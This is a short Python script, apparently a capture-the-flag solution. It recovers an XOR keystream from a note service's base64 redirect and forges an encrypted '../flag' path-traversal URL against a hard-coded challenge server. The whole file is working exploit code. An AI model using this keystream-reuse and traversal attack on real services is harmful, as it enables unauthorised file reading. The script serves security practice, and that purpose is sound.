import base64
import requests


def xor_bytes(b1, b2):
    return bytes(a ^ b for a, b in zip(b1, b2))


id7 = requests.get("http://35.200.110.16:8081/id").text[:7]
note = requests.post(
    "http://35.200.110.16:8081/note",
    json={
        "data": "satoki",
    },
    allow_redirects=False,
)
url7 = base64.b64decode(note.headers.get("Location").replace("/note/", ""))[:7]

key7 = xor_bytes(id7.encode(), url7)
flag_url = xor_bytes(key7, b"../flag")

print(base64.b64encode(flag_url).decode())
